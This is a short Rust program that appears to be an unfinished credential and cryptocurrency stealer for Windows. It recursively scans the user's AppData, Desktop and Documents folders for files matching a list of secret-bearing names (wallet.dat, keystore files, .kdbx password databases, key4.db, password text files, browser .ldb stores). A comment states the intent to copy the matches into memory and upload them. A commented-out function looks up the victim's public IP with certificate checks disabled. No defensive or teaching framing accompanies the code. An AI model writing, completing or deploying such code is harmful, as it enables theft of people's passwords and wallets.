
use std::borrow::Borrow;
use std::fmt::Error;
use std::ops::Deref;
use std::path::{Path, PathBuf};

use dirs;
use walkdir::WalkDir;
use whoami;


const MASKS: [&str; 13] = ["wallet.dat", ".wallet", ".mmd", ".kdbx", "UTC--20", "password", "passwords", "pass.txt", "key4.db", "login.bak", "key.bak", ".log", ".ldb"];

fn main() {
    //dirs::home_dir -> C:/Users/Alice
    //dirs::data_local_dir();
    let home = get_home_dir().to_str().unwrap().to_owned();
    let appdata = home.clone() + "\\AppData";
    let desktop = home.clone() + "\\Desktop";
    let documents = home.clone() + "\\Documents";
    walk_files(appdata);
    walk_files(desktop);
    walk_files(documents);
    //test
   // println!("{}", fetch_ip());
}


fn walk_files(path: String) {
    for entry in WalkDir::new(path)
        .follow_links(true)
        .into_iter()
        .filter_map(|e| e.ok()) {
        let f_name = entry.file_name().to_string_lossy();
        if is_important_file(f_name.as_ref()) {
            println!("{}", entry.path().to_str().unwrap().clone().to_owned() + "\\" +&f_name.as_ref());
            //copy files into memory and upload
        }
    }
}

fn is_important_file(file_name: &str) -> bool {
    MASKS
        .iter()
        .any(|&suffix| file_name.contains(suffix))
}

fn get_home_dir() -> PathBuf {
    return dirs::home_dir().unwrap();
}

fn fetch_ip() -> String {
    let client = reqwest::blocking::Client::builder().danger_accept_invalid_certs(true).build().unwrap();
    if let Ok(resp) = client.get("https://ifconfig.me/ip").send() {
        return resp.text().unwrap();
    } else {
        return "0.0.0.0".to_string();
    }
}